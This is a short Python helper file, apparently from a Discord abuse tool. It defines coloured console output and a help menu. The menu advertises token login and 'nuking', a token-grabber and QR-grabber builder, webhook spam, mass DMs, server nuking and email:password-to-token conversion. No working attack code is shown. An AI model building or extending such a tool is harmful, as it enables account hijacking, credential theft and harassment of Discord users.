from colorama import Fore, Style

blue = Fore.BLUE + Style.BRIGHT
red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
yellow = Fore.YELLOW + Style.BRIGHT
magenta = Fore.MAGENTA + Style.BRIGHT
cyan = Fore.CYAN + Style.BRIGHT
white = Fore.WHITE + Style.BRIGHT

def help():
    print('''
login <token>               | Logs in as user token
ipinfo <ip>                 | Check IP Info
wspam <webhook> <msg>       | Spams the webhook
wdelete <webhook>           | Deletes the webhook
wsend <webhook> <msg>       | Sends a message to the webhook
nuke <token>                | Destroys the token
msgall <token> <msg>        | Messages the full dmlist on the token
deletedms <token>           | Deletes all dms on the token
blockall <token>            | Blocks all friends on the token
ping <ip>                   | Is this website down?
gcspam <token>              | Spam creates groupchats on the token
tinfo <token>               | Gives you general info about the token
qrgrabber                   | Makes an "image" grabber by scanning the qr
snuke <token> <server_id>   | Nukes the discord server of a bot
flashbang <token>           | Switches between dark/light mode.
slookup <server_invite>     | Gets general info about the server invite
ufall <token>               | Unfriends all friends on the token
lservers <token>            | Leaves all the servers on the token
screate <token>             | Mass creates servers on the token
ctoken <token>              | Checks if the token is valid
tsteal <webhook>            | Makes a discord token grabber
tmake                       | Makes a discord account (Captcha Solved by user)
epasstk                     | Email:password to token''')


def success(_str):
    print(f'{green}[  {white}+  {green}] {white}{_str}')

def error(_str):
    print(f'{red}[  {white}x  {red}] {white}{_str}')

def loading(_str):
    print(f'{yellow}[  {white}*  {yellow}] {white}{_str}')